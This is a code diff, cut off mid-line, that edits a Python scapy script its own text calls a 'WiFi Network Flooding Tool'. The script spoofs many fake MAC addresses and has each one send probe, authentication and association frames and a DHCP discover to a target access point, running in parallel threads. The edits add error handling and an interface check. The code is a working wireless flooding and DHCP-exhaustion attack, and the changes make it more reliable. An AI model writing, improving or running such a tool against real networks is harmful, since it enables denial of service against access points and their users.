@@ -72,25 +72,29 @@ def simulate_connection_request(interface, ssid, ap_mac, device_id):
     
     print(f"Simulating connection request from device {device_id}: {device_name} ({fake_mac})")
     
-    # Create and send probe request
-    probe_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11ProbeReq()/Dot11Elt(ID='SSID', info=ssid)
-    sendp(probe_req, iface=interface, verbose=0)
-    time.sleep(random.uniform(0.1, 0.3))
-    
-    # Create and send authentication request
-    auth_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11Auth(seqnum=1, algo=0)
-    sendp(auth_req, iface=interface, verbose=0)
-    time.sleep(random.uniform(0.1, 0.3))
-    
-    # Create and send association request with device info
-    asso_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11AssoReq()/Dot11Elt(ID='SSID', info=ssid)/Dot11Elt(ID=221, info=device_name.encode())
-    sendp(asso_req, iface=interface, verbose=0)
-    
-    # Send DHCP discover with hostname
-    dhcp_discover = Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=[int(x, 16) for x in fake_mac.split(':')])/DHCP(options=[('message-type', 'discover'), ('hostname', device_name), 'end'])
-    sendp(dhcp_discover, iface=interface, verbose=0)
-    
-    return fake_mac, device_name
+    try:
+        # Create and send probe request
+        probe_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11ProbeReq()/Dot11Elt(ID='SSID', info=ssid)
+        sendp(probe_req, iface=interface, verbose=0)
+        time.sleep(random.uniform(0.1, 0.3))
+        
+        # Create and send authentication request
+        auth_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11Auth(seqnum=1, algo=0)
+        sendp(auth_req, iface=interface, verbose=0)
+        time.sleep(random.uniform(0.1, 0.3))
+        
+        # Create and send association request with device info
+        asso_req = RadioTap()/Dot11(addr1=ap_mac, addr2=fake_mac, addr3=ap_mac)/Dot11AssoReq()/Dot11Elt(ID='SSID', info=ssid)/Dot11Elt(ID=221, info=device_name.encode())
+        sendp(asso_req, iface=interface, verbose=0)
+        
+        # Send DHCP discover with hostname
+        dhcp_discover = Ether(src=fake_mac, dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=[int(x, 16) for x in fake_mac.split(':')])/DHCP(options=[('message-type', 'discover'), ('hostname', device_name), 'end'])
+        sendp(dhcp_discover, iface=interface, verbose=0)
+        
+        return fake_mac, device_name
+    except Exception as e:
+        print(f"Error simulating device {device_id}: {e}")
+        return None, None
 
 def get_ap_mac(interface, ssid):
     """Get the MAC address of the access point for the given SSID"""
@@ -109,8 +113,8 @@ def get_ap_mac(interface, ssid):
                 if current_ssid == ssid and ap_mac:
                     return ap_mac
         return None
-    except:
-        print("Could not determine AP MAC address, using broadcast")
+    except Exception as e:
+        print(f"Error scanning for AP: {e}")
         return 'ff:ff:ff:ff:ff:ff'
 
 def simulate_connection_requests(interface, ssid, num_devices=20, max_workers=5, delay=0.5):
@@ -133,31 +137,26 @@ def simulate_connection_requests(interface, ssid, num_devices=20, max_workers=5,
         subprocess.run(['airmon-ng', 'start', interface], check=True)
         mon_interface = interface + 'mon'
         print(f"Monitor mode enabled on {mon_interface}")
-    except:
+    except Exception as e:
+        print(f"Error starting monitor mode: {e}")
         # Fallback if airmon-ng is not available
         mon_interface = interface
         print("Continuing without explicit monitor mode setup")
     
+    # Check if interface exists
+    try:
+        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
+        if mon_interface not in result.stdout:
+            print(f"Interface {mon_interface} not found. Available interfaces:")
+            print(result.stdout)
+            return
+    except Exception as e:
+        print(f"Error checking interfaces: {e}")
+    
     # Create devices in batches
+    successful_devices = 0
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = []
         for i in range(num_devices):
             futures.append(executor.submit(simulate_connection_request, mon_interface, ssid, ap_mac, i+1))
-            # Add a small delay between starting each thread to avoid overwhelming the network
-            time.sleep(delay)
-        
-        # Wait for all devices to be created
-        for future in futures:
-            future.result()
-    
-    # Stop monitor mode if we started it
-    try:
-        subprocess.run(['airmon-ng', 'stop', mon_interface], check=True)
-    except:
-        pass
-    
-    print("Fake device simulation complete")
-
-def main():
-    parser = argparse.ArgumentParser(description='WiFi Network Flooding Tool (No Connection)')
-    parser
+            # Add a small delay between
